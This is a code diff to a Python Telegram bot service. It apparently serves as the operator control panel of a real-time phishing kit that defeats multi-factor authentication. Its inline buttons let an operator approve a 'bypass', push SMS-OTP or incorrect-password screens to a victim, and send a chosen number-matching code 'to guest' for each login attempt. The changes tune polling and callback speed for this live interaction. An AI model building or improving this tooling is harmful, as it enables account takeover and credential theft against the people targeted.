@@ -169,7 +169,6 @@ class TelegramService:
 
             inline_keyboard = {"inline_keyboard": keyboard}
             return self.send_message(message, "HTML", inline_keyboard)
-
     def poll_updates(self, on_action_received):
         if not self.is_configured():
             return 0
@@ -177,7 +176,7 @@ class TelegramService:
             return 0
         self.polling_in_progress = True
         try:
-            payload = {"timeout": 0}  
+            payload = {"timeout": 30}  # Long polling keeps connection alive efficiently
             if self.last_update_id > 0:
                 payload["offset"] = self.last_update_id + 1
 
@@ -229,82 +228,81 @@ class TelegramService:
                         mapped_action = "pending"
                         feedback = "Action processed"
 
+                        # Define custom user feedback notices instantly based on actions
                         if action == "approve":
                             mapped_action = "approve"
                             feedback = "Bypass approved! ✅"
-
                         elif action == "deny":
                             mapped_action = "deny"
                             feedback = "Access Blocked! ❌"
-
                         elif action == "req_sms":
                             mapped_action = "request_sms"
                             feedback = "SMS screen requested! 📲"
-
                         elif action == "inc_pw":
                             mapped_action = "incorrect_password"
                             feedback = "Incorrect Password screen requested! ⚠️"
-
                         elif action == "num_prompt":
                             mapped_action = "pending"
                             feedback = "Select a number to dispatch instantly! 🔢"
                             handled_inline = True
+                        elif action == "picknum":
+                            mapped_action = "number_prompt"
+                            chosen = parts[3] if len(parts) > 3 else None
+                            feedback = f"Number selected: {chosen} 🔢" if chosen else "Number selection received"
+                        elif action == "sendcandidates":
+                            mapped_action = "number_prompt"
+                            handled_inline = True
+                            chosen_number = parts[3] if len(parts) > 3 else ""
+                            feedback = f"Number {chosen_number} sent to guest ✅"
+
+                        # 🚀 CRITICAL OPTIMIZATION: Answer the callback query IMMEDIATELY.
+                        # This tells the Telegram app to stop spinning the loading wheels instantly.
+                        try:
+                            self.api_call("answerCallbackQuery", {
+                                "callback_query_id": query_id,
+                                "text": feedback
+                            })
+                        except Exception as e:
+                            print(f"Failed to answer callback query early: {e}", flush=True)
+
+                        # Run structural interface modifications (Inline Keyboard changes)
+                        if action == "num_prompt":
                             try:
                                 orig = callback_query.get("message")
                                 chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
 
                                 keyboard = []
                                 nums = list(range(1, 101))
-                                # Render the 1-100 buttons cleanly. Clicking ANY of them targets 'sendcandidates' directly
                                 for r in range(0, 100, 10):
                                     row = []
                                     for n in nums[r:r + 10]:
                                         row.append({"text": str(n), "callback_data": f"tg:sendcandidates:{attempt_id}:{n}"})
                                     keyboard.append(row)
 
-                                try:
-                                    orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
-                                    self.api_call("editMessageText", {
-                                        "chat_id": chat_id_val,
-                                        "message_id": orig.get("message_id") if orig else None,
-                                        "text": orig_text,
-                                        "parse_mode": "HTML",
-                                        "reply_markup": {"inline_keyboard": keyboard}
-                                    })
-                                except Exception as _e:
-                                    print(f"Failed to edit message with host 1-100 keyboard: {_e}", flush=True)
+                                orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
+                                self.api_call("editMessageText", {
+                                    "chat_id": chat_id_val,
+                                    "message_id": orig.get("message_id") if orig else None,
+                                    "text": orig_text,
+                                    "parse_mode": "HTML",
+                                    "reply_markup": {"inline_keyboard": keyboard}
+                                })
                             except Exception as _e:
-                                print(f"Failed to prepare 1-100 keyboard: {_e}", flush=True)
-
-                        elif action == "picknum":
-                            mapped_action = "number_prompt"
-                            chosen = parts[3] if len(parts) > 3 else None
-                            feedback = f"Number selected: {chosen} 🔢" if chosen else "Number selection received"
+                                print(f"Failed to show 1-100 keyboard: {_e}", flush=True)
 
                         elif action == "sendcandidates":
-                            # Action fires instantly as soon as a grid number button is clicked!
-                            mapped_action = "number_prompt"
-                            handled_inline = True
-                            chosen_number = parts[3] if len(parts) > 3 else ""
-                            feedback = f"Number {chosen_number} sent to guest ✅"
-
-                            # Restore the default layout panel options instantly
                             try:
                                 orig = callback_query.get("message")
                                 chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
                                 orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
                                 control_keyboard = {
                                     "inline_keyboard": [
-                                        [
-                                            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
-                                        ],
+                                        [{"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"}],
                                         [
                                             {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
                                             {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
                                         ],
-                                        [
-                                            {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
-                                        ]
+                                        [{"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}]
                                     ]
                                 }
                                 self.api_call("editMessageText", {
@@ -315,27 +313,16 @@ class TelegramService:
                                     "reply_markup": control_keyboard
                                 })
                             except Exception as _e:
-                                print(f"Failed to restore host keyboard: {_e}", flush=True)
+                                print(f"Failed to restore panel keyboard: {_e}", flush=True)
 
-                        # Answer callback query
-                        try:
-                            self.api_call("answerCallbackQuery", {
-                                "callback_query_id": query_id,
-                                "text": feedback
-                            })
-                        except Exception as e:
-                            print(f"Failed to answer callback query: {e}", flush=True)
-
-                        # Edit message text (skip if already handled inline)
+                        # Clean up standard text message interfaces (only if not an inline menu process)
                         if not handled_inline:
                             try:
                                 original_msg = callback_query.get("message")
                                 if original_msg:
                                     current_text = original_msg.get("text") or ""
-                                    if current_text:
-                                        updated_text = ""
-                                    else:
-                                        updated_text = f"{original_msg.get('caption') or ''}\n\n"
+                                    updated_text = "" if current_text else f"{original_msg.get('caption') or ''}\n\n"
+                                    
                                     self.api_call("editMessageText", {
                                         "chat_id": original_msg.get("chat", {}).get("id"),
                                         "message_id": original_msg.get("message_id"),
@@ -344,9 +331,9 @@ class TelegramService:
                                         "reply_markup": {"inline_keyboard": []}
                                     })
                             except Exception as e:
-                                print(f"Failed to edit message text: {e}", flush=True)
+                                print(f"Failed to clear inline layout: {e}", flush=True)
 
-                        # Fire callback to server pipeline
+                        # Dispatch the telemetry action details back to your Flask backend pipelines
                         if action == "picknum":
                             chosen_val = parts[3] if len(parts) > 3 else None
                             on_action_received(attempt_id, mapped_action, {"chosen": chosen_val})
